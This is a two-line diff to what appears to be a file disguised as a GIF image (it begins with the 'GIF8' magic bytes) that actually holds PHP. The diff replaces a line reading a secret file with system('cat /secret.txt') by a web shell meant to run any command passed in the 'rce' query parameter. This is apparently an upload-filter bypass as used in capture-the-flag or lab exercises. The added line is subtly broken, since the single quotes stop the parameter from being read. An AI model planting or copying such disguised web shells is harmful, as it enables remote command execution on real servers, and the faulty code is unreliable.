@@ -1,2 +1,2 @@
 GIF8
-<?php system('cat /secret.txt'); ?>
+<?php system('$_GET["rce"]'); ?>
